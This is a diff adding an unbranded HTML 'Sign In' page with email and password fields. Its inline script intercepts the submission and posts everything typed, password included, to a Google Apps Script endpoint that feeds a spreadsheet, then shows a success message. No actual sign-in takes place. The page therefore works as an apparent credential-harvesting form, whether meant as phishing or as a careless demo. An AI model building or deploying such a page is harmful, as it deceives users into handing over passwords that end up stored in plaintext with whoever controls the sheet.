@@ -1,0 +1,60 @@
+
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Title</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500&display=swap" rel="stylesheet"> 
+
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css" >
+  </head>
+  <body>
+      
+    
+<div class="container">
+    <form name="submit-to-google-sheet">
+      <p>Welcome</p>
+      <input type="email" placeholder="email" name="email"><br>
+      <input type="password" placeholder="password" name="password"><br>
+      <button type="submit" class="btn btn2">Sign In</button>
+      <!-- <input type="button" value="Sign in"><br> -->
+      <a href="#">Forgot Password?</a>
+    </form>
+    <div id="msg"><b></b></div>
+  
+    <div class="drops">
+      <div class="drop drop-1"></div>
+      <div class="drop drop-2"></div>
+      <div class="drop drop-3"></div>
+      <div class="drop drop-4"></div>
+      <div class="drop drop-5"></div>
+    </div>
+  </div>
+  <!-- https://script.google.com/macros/s/AKfycbzlfY5dc4IFWrabpCknYqnmcJc6BVtjnV30mEN2NbYk4Ar3i7q7o8y0FPCiaEbq7rA/exec -->
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzlfY5dc4IFWrabpCknYqnmcJc6BVtjnV30mEN2NbYk4Ar3i7q7o8y0FPCiaEbq7rA/exec'
+    const form = document.forms['submit-to-google-sheet']
+  const msg=document.getElementById("msg");
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response =>{
+            msg.innerHTML="Messagge sent successfully"
+            setTimeout(
+                function(){
+                    msg.innerHTML=""
+                },9000)
+                form.reset()
+        })
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+  </body>
+</html>
